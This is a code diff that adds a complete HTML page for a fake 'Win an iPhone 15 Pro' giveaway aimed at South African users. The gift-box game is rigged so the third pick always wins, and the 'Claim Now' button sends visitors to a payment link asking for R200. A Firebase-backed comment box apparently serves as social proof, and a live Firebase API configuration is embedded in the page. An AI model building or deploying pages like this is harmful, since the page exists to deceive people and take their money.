@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Win an iPhone 15 Pro</title>
+  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+  <style>
+    body { font-family: Arial, sans-serif; background: #f1f1f1; text-align: center; margin: 0; padding: 0; }
+    .container { max-width: 600px; margin: 40px auto; background: #fff; padding: 30px; border-radius: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
+    button { background-color: #1976d2; color: white; border: none; padding: 12px 20px; font-size: 16px; border-radius: 8px; cursor: pointer; }
+    button:hover { background-color: #1565c0; }
+    textarea, input { width: 100%; padding: 10px; margin: 10px 0; border-radius: 5px; border: 1px solid #ccc; }
+    .comment { text-align: left; border: 1px solid #ddd; border-radius: 10px; padding: 10px; margin-top: 10px; }
+    .gift-boxes { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-top: 20px; }
+    .gift-button { font-size: 40px; background: none; border: none; cursor: pointer; transition: transform 0.3s ease; }
+    .gift-button.opened { transform: scale(1.2); }
+    .hidden { display: none; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Win an iPhone 15 Pro!</h1>
+    <img src="iphone.jpg" alt="iPhone" style="width:100%; max-width:300px;"><br>
+    <p><strong>Answer these quick questions to qualify.</strong></p>
+
+    <!-- Survey -->
+    <div id="questions">
+      <p>1. Are you from South Africa?</p>
+      <button onclick="nextQuestion(2)">Yes</button> <button onclick="endSurvey()">No</button>
+      <div id="q2" class="hidden">
+        <p>2. Did you buy something online recently?</p>
+        <button onclick="nextQuestion(3)">Yes</button> <button onclick="endSurvey()">No</button>
+      </div>
+      <div id="q3" class="hidden">
+        <p>3. Would you like to receive the iPhone 15 Pro for R200?</p>
+        <button onclick="showGiftGame()">Yes</button> <button onclick="endSurvey()">No</button>
+      </div>
+    </div>
+
+    <!-- Comments -->
+    <h3>Leave a Comment:</h3>
+    <textarea id="commentInput" placeholder="Write your comment..."></textarea>
+    <button onclick="submitComment()">Submit</button>
+    <div id="commentList"></div>
+
+    <!-- Gift Boxes -->
+    <div id="giftGame" class="hidden">
+      <h3>Pick a gift box — you have 3 tries!</h3>
+      <div class="gift-boxes" id="giftBoxes"></div>
+    </div>
+
+    <!-- Winning Message -->
+    <div id="winMessage" class="hidden">
+      <h2>Congratulations!</h2>
+      <p>You’ve won the iPhone 15 Pro! Click below to claim it.</p>
+      <button onclick="location.href='https://buymeacoffee.com/terro/claim-your-iphone-15-pro-r200'">Claim Now</button>
+    </div>
+  </div>
+
+  <script>
+    // ✅ YOUR FIREBASE CONFIG — ready to use
+    const firebaseConfig = {
+      apiKey: "AIzaSyAiSkM-Et60UiAEi6yHHoiBY04nQwc3kKM",
+      authDomain: "iphone-gift-75085.firebaseapp.com",
+      databaseURL: "https://iphone-gift-75085-default-rtdb.firebaseio.com",
+      projectId: "iphone-gift-75085",
+      storageBucket: "iphone-gift-75085.firebasestorage.app",
+      messagingSenderId: "586792676502",
+      appId: "1:586792676502:web:71580db2d5c354a3fe66b7"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    // Survey logic
+    function nextQuestion(step) {
+      document.getElementById("q" + step).classList.remove("hidden");
+    }
+    function endSurvey() {
+      alert("Sorry, only selected users can continue.");
+      location.reload();
+    }
+
+    // Gift logic
+    let tries = 0;
+    function showGiftGame() {
+      document.getElementById("giftGame").classList.remove("hidden");
+      generateGiftBoxes();
+    }
+    function generateGiftBoxes() {
+      const container = document.getElementById("giftBoxes");
+      container.innerHTML = "";
+      for (let i = 0; i < 9; i++) {
+        const btn = document.createElement("button");
+        btn.classList.add("gift-button");
+        btn.textContent = "🎁";
+        btn.onclick = () => pickBox(btn);
+        container.appendChild(btn);
+      }
+    }
+    function pickBox(btn) {
+      if (btn.classList.contains("opened") || tries >= 3) return;
+      btn.classList.add("opened");
+      if (tries === 2) {
+        btn.innerHTML = '<img src="iphone.jpg" style="width:60px;">';
+        setTimeout(() => {
+          document.getElementById("giftGame").classList.add("hidden");
+          document.getElementById("winMessage").classList.remove("hidden");
+        }, 1200);
+      } else {
+        btn.textContent = "Empty";
+      }
+      tries++;
+    }
+
+    // Comments
+    function submitComment() {
+      const text = document.getElementById("commentInput").value.trim();
+      if (!text) return alert("Write a comment first.");
+      db.ref("comments").push({ text });
+      document.getElementById("commentInput").value = "";
+    }
+
+    function loadComments() {
+      const list = document.getElementById("commentList");
+      db.ref("comments").on("child_added", snap => {
+        const div = document.createElement("div");
+        div.className = "comment";
+        div.innerText = snap.val().text;
+        list.appendChild(div);
+      });
+    }
+
+    loadComments();
+  </script>
+</body>
+</html>
